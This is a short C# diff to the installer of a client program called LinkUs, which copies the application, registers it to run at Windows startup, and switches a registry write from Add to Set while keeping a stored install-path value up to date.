@@ -29,7 +29,7 @@ namespace LinkUs.Client.Install
 
             _fileService.Copy(_environment.ApplicationPath, targetFilePath);
             _registry.AddFileToStartupRegistry(targetFilePath);
-            _registry.Add(FilePathLocationRegistry, FilePathLocationRegistryKey, targetFilePath);
+            _registry.Set(FilePathLocationRegistry, FilePathLocationRegistryKey, targetFilePath);
 
             return targetFilePath;
         }
@@ -41,6 +41,9 @@ namespace LinkUs.Client.Install
         {
             if (_registry.IsRegisteredAtStartup(_environment.ApplicationPath) == false) {
                 _registry.AddFileToStartupRegistry(_environment.ApplicationPath);
+            }
+            if (GetCurrentInstalledApplicationPath() != _environment.ApplicationPath) {
+                _registry.Set(FilePathLocationRegistry, FilePathLocationRegistryKey, _environment.ApplicationPath);
             }
         }
         public string GetCurrentInstalledApplicationPath()
